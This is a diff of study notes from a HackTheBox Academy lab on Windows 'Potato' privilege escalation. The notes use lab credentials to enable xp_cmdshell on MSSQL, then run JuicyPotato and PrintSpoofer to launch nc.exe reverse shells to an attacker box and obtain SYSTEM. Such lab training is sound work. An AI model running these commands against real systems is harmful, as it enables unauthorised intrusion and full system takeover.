@@ -1,5 +1,7 @@
 # Potato Impersonation Attack
 
+This is from the [Windows Privilege Escalation](https://academy.hackthebox.com/module/67/section/2501) course on the HackTheBox Academy site.
+
 - Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges.
 - Processes generally do this by making a call to the `WinLogon` process to get a `SYSTEM` token, then executing itself with that token placing it within the SYSTEM space.
 - Attackers often abuse this privilege in the "Potato style" privesc - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges.
@@ -14,7 +16,7 @@
 
 - Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.
 
-```
+```bash
 Kamino@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-authImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
 
 Password:
@@ -36,7 +38,7 @@ SQL>
 - We can do this via the `Impacket` MSSSQL shell by typing `enable_xp_cmdshell`.
 - Typing `help` displays a few other command options.
 
-```
+```bash
 SQL> enable_xp_cmdshell
 
 [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -50,7 +52,7 @@ Note: We don't actually have to type `RECONFIGURE` as `Impacket` does this for
 
 - With this access, we can confirm that we are indeed running in the context of a SQL Server service account.
 
-```
+```bash
 SQL> xp_cmdshell whoami
 
 output
@@ -64,7 +66,7 @@ nt service\mssql$sqlexpress01
 
 - Next, let's check what privileges the service account has been granted.
 
-```
+```bash
 SQL> xp_cmdshell whoami /priv
 
 output
@@ -97,7 +99,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 - Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call.
 - Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
 
-```
+```bash
 SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
 
 output
@@ -116,7 +118,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 
 - This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.
 
-```
+```bash
 Kamino@htb[/htb]$ sudo nc -lnvp 8443listening on [any] 8443 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
 Microsoft Windows [Version 10.0.14393]
@@ -145,7 +147,7 @@ WINLPE-SRV01
 - We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command.
 - Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).
 
-```
+```bash
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 
 output
